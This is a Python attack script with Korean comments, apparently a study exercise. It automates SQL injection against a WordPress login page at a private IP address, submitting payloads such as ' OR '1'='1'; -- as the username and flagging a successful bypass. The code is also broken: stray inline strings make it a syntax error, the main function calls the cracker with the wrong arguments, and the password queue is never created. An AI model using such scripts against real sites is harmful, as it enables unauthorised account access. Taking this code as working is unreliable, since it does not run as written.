'''로직
SQL 주입은 로그인 페이지의 사용자 아이디를 입력하는 부분에 사용자 아이디 대신 SQL코드를 입력하는 것.
webAuthCracker.py 의 코드를 약간만 변형하면 SQL 주입을 위한 코드가 된다. '''

from urllib.request import build_opener, HTTPCookieProcessor #지정된 URL에 대한 요철 처리를 위해 
import http.cookiejar as cookielib    #쿠키를 처리하기 위한 다양한 메소드 제공
from html.parser import HTMLParser    #HTML소스코드를 파싱하기 위한 다양한 메소드를 제공
from urllib.parse import urlencode    #입력된 인자를 HTTP의 쿼리 문자열로 인코딩한다. 

sqlcodes = ['\'', '--', '/*', '"', '\' OR\'1\' = \'1\'; --']        '''추가한 코드. SQL 주입 코드 예'''

targeturl = 'http://192.168.0.14/blog/wp-login.php' #로그인 페이지
targetpost = 'http://192.168.0.14/blog/wp-login.php' #로그인 처리 코드

username_field = 'log'    #로그인 input 태그의 사용자 아이디 입력부 이름
pass_field = 'pwd'        #로그인 input 태그의 패스워드 입력부 이름
check = 'update'            #로그인 성공여부를 판단하는 문자열
isBingo = False            #크래킹 성공 시 스레드 중지를 위한 플래그


'''<input type="text" name="log" id="user_login" class="input" value="" size="20"
<input type="password" name="pwd" id="user_pass" class="input" value="" size="20"'''
class myHTMLParser(HTMLParser):                    #HTMLParser 클래스를 상속하여 정의한 클래스다.
    def __init__(self):                        #클래스 초기화 메서드에서 부모 클래스인 HTMLParser 클래스의 초기화 메소드를 호출한다. 
        HTMLParser.__init__(self)
        self.tagResult = {}
    
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tagname = None
            tagvalue = None
            for name , value in attrs:
                if name == 'name':
                    tagname = value
                if name == 'value':
                    tagvalue = value
                    
            if tagname is not None:
                self.tagResult[tagname] = tagvalue        #{'name':'log'}

def webAuthCracker(q, username):
    global isBingo
    password = ''  '''추가한 라인'''
    while not q.empty() and not isBingo:
        password = q.get().rstrip()                    #큐로부터 데이터를 하나 추출한 후 공백을 제거한 내용을 password 변수에 담는다. 
        cookies = cookielib.FileCookieJar('cookies')    #웹 서버로부터 전달되는 쿠키를 'cookies'라는 파일에 저장하기 위해 FileCookieJar('cookies')객체를 생성한다. 
        opener = build_opener(HTTPCookieProcessor(cookies))    #쿠리 저장파일을 HTTPCookieProcessor를 이용해 build_opener의 쿠키저장소로 설정해준다.
        res = opener.open(targeturl)                  #open() 함수를 이용해 targeturl로 요청한다.
        htmlpage=res.read().decode()                    #targeturl로 요청하여 응답받은 HTML코드는 바이트 문자열이므로 유니코드로 변환하여 htmlpage에 저장한다. 
            
        print('+++TRYING %s : %s ' %(username, password))
        parseR = myHTMLParser()
        parseR.feed(htmlpage)
        inputtags = parseR.tagResult
        inputtags[username_field] = username
        inputtags[pass_field] = password
        
        loginData = urlencode(inputtags).encode('utf-8')
        loginRes = opener.open(targetpost, data=loginData)
        loginResult = loginRes.read().decode()
        
        if check in loginResult:
            isBingo = True
            print('---CRACKING SUCCESS!')
            print('---SQL INJECTION [%s]' %username)
            
def main():
    print('+++SQL INJECTION START...')
    for sqlcode in sqlcodes:
        print('>>>INJECT SQL [%s]' %sqlcode)
        webAuthCracker(sqlcode)
        
if __name__ == '__main__':
    main()
                